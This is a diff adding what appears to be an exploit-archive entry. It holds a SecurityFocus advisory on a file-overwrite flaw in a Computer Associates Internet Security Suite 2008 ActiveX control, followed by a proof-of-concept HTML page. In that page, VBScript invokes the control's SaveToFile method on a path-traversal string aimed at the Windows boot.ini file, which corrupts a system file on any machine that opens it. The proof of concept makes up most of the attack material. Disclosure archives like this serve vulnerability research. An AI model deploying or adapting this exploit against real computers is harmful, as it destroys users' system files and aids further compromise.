@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/29406/info
+
+A Computer Associates Internet Security Suite ActiveX control is prone to a vulnerability that lets attackers overwrite files with arbitrary, attacker-controlled content. The issue occurs because the control fails to sanitize user-supplied input.
+
+Successful exploits will compromise affected computers and will aid in further attacks.
+
+Internet Security Suite 2008 is vulnerable; other versions may also be affected. 
+
+<!--
+CA Internet Security Suite 2008 (UmxEventCli.dll/SaveToFile())
+remote file corruption poc
+by Nine:Situations:Group::surfista
+
+this control is safe for scripting
+and safe for initialize
+
+original one: http://retrogod.altervista.org/9sg_CA_poc.html
+--> 
+&lt;html&gt;&lt;object classid=&#039;clsid:F13D3742-6C4F-4915-BF91-784BA02DD0BE&#039; 
+id=&#039;UmxEventCliLib&#039;/&gt;
+&lt;/object&gt;&lt;script language=&#039;vbscript&#039;&gt;
+filePath=&quot;..\..\..\..\..\..\..\boot.ini&quot;
+UmxEventCliLib.SaveToFile filePath
+&lt;/script&gt;&lt;/html&gt; 
+
+
